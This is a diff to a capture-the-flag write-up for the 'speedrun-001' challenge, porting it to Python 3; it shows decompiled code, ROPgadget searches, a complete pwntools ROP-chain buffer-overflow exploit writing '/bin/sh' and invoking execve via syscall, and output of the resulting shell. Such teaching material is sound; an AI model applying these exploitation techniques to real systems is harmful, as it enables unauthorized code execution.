@@ -128,6 +128,22 @@ main(undefined8 uParm1,undefined8 uParm2,undefined8 uParm3,undefined8 uParm4,und
 }
 ```
 
+(W could also find this code path by looking at the `entry` function:
+
+```
+void entry(undefined8 param_1,undefined8 param_2,undefined8 param_3)
+
+{
+  undefined8 in_stack_00000000;
+  undefined auStack8 [8];
+ 
+  FUN_00400ea0(main,in_stack_00000000,&stack0x00000008,FUN_00401900,FUN_004019a0,param_3,auStack8);
+  do {
+                    /* WARNING: Do nothing block with infinite loop */
+  } while( true );
+}
+```
+
 When we look at the functions `FUN_00400b4d` and ` FUN_00400bae`, we see that the essentially just print out text (which matches with what we saw earlier). Looking at the `FUN_00400b60` function shows us something interesting:
 
 ```
@@ -282,7 +298,7 @@ Stack level 0, frame at 0x7fffffffde40:
 So we can see that the offset is `0x7fffffffde38 - 0x7fffffffda30 = 0x408` bytes. With that, the last thing we need is to find the ROP gadgets we will use. This time we will be using a utility called `ROPgadget` from https://github.com/JonathanSalwan/ROPgadget. This will just be a python script which will give us gadgets for a binary we give it. First let's just get four gadgets to just pop values into the four registers we need:
 
 ```
-$    python ROPgadget.py --binary speedrun-001 | grep "pop rax ; ret"
+$   python3 ROPgadget.py --binary speedrun-001 | grep "pop rax ; ret"
 0x0000000000415662 : add ch, al ; pop rax ; ret
 0x0000000000415661 : cli ; add ch, al ; pop rax ; ret
 0x00000000004a9321 : in al, 0x4c ; pop rax ; retf
@@ -290,17 +306,17 @@ $    python ROPgadget.py --binary speedrun-001 | grep "pop rax ; ret"
 0x000000000048cccb : pop rax ; ret 0x22
 0x00000000004a9323 : pop rax ; retf
 0x00000000004758a3 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
-$    python ROPgadget.py --binary speedrun-001 | grep "pop rdi ; ret"
+$    python3 ROPgadget.py --binary speedrun-001 | grep "pop rdi ; ret"
 0x0000000000423788 : add byte ptr [rax - 0x77], cl ; fsubp st(0) ; pop rdi ; ret
 0x000000000042378b : fsubp st(0) ; pop rdi ; ret
 0x0000000000400686 : pop rdi ; ret
-$    python ROPgadget.py --binary speedrun-001 | grep "pop rsi ; ret"
+$    python3 ROPgadget.py --binary speedrun-001 | grep "pop rsi ; ret"
 0x000000000046759d : add byte ptr [rbp + rcx*4 + 0x35], cl ; pop rsi ; ret
 0x000000000048ac68 : cmp byte ptr [rbx + 0x41], bl ; pop rsi ; ret
 0x000000000044be39 : pop rdx ; pop rsi ; ret
 0x00000000004101f3 : pop rsi ; ret
-$    python ROPgadget.py --binary speedrun-001 | grep "pop rdx ; ret"
-0x00000000004a8881 : js 0x4a8901 ; pop rdx ; retf
+$    python3 ROPgadget.py --binary speedrun-001 | grep "pop rdx ; ret"
+0x00000000004a8881 : js 0x4a88fe ; pop rdx ; retf
 0x00000000004498b5 : pop rdx ; ret
 0x000000000045fe71 : pop rdx ; retf
 ```
@@ -308,7 +324,7 @@ $    python ROPgadget.py --binary speedrun-001 | grep "pop rdx ; ret"
 So we found our four gadgets at the addresses `0x415664`, `0x400686`, `0x4101f3`, and `0x4498b5`. Next we will need a gadget which will write the string `/bin/sh` somewhere to memory. For this I looked through all of the gadgets with a `mov` instruction:
 
 ```
-$    python ROPgadget.py --binary speedrun-001 | grep "mov" | less
+$    python3 ROPgadget.py --binary speedrun-001 | grep "mov" | less
 ```
 
 Looking through the giant list, this one seems like it would fit our needs perfectly:
@@ -320,11 +336,11 @@ Looking through the giant list, this one seems like it would fit our needs perfe
 This gadget will allow us to write an `8` byte value stored in `rdx` to whatever address is pointed to by the `rax` register. In addition it's kind of convenient since we can use the four gadgets we found earlier to prep this write. Lastly we just need to find a gadget for `syscall`:
 
 ```
-$    python ROPgadget.py --binary speedrun-001 | grep ": syscall"
+$    python3 ROPgadget.py --binary speedrun-001 | grep ": syscall"
 0x000000000040129c : syscall
 ```
 
-Keep in mind that our ROP chain is comprised of addresses to instructions, and not the instructions themselves. So we will overwrite the return address with the first gadget of the ROP chain, and when it returns it will keep on going down the chain until we get our shell. Also for moving values into registers, we will store those values on the stack in the ROP Chain, and they will just be popped off into the regisets. Putting it all together we get the following exploit:
+Keep in mind that our ROP chain consists of addresses to instructions, and not the instructions themselves. So we will overwrite the return address with the first gadget of the ROP chain, and when it returns it will keep on going down the chain until we get our shell. Also for moving values into registers, we will store those values on the stack in the ROP Chain, and they will just be popped off into the regisets. Putting it all together we get the following exploit:
 
 ```
 from pwn import *
@@ -352,9 +368,9 @@ pop rdx, 0x2f62696e2f736800
 pop rax, 0x6b6000
 mov qword ptr [rax], rdx
 '''
-rop = ''
+rop = b""
 rop += popRdx
-rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
+rop += b"/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
 rop += popRax
 rop += p64(0x6b6000)
 rop += writeGadget
@@ -385,7 +401,7 @@ rop += syscall
 
 
 # Add the padding to the saved return address
-payload = "0"*0x408 + rop
+payload = b"0"*0x408 + rop
 
 # Send the payload, drop to an interactive shell to use our new shell
 target.sendline(payload)
@@ -395,18 +411,20 @@ target.interactive()
 
 When we run it:
 ```
-$    python exploit.py
-[+] Starting local process './speedrun-001': pid 12189
+$   python3 exploit.py
+[+] Starting local process './speedrun-001': pid 3544
 [*] Switching to interactive mode
 Hello brave new challenger
 Any last words?
 This will be the last thing that you say: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\xb5\x98D
 $ w
- 03:19:37 up 13:12,  1 user,  load average: 0.51, 0.97, 0.88
+ 17:18:06 up  1:07,  1 user,  load average: 0.37, 0.19, 0.10
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-guyinatu :0       :0               Wed14   ?xdm?  14:26   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
+guyinatu :0       :0               16:17   ?xdm?   2:44   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu
 $ ls
 exploit.py  readme.md  speedrun-001
+[*] Got EOF while reading in interactive
+$  
 ```
 
 Just like that, we popped a shell!
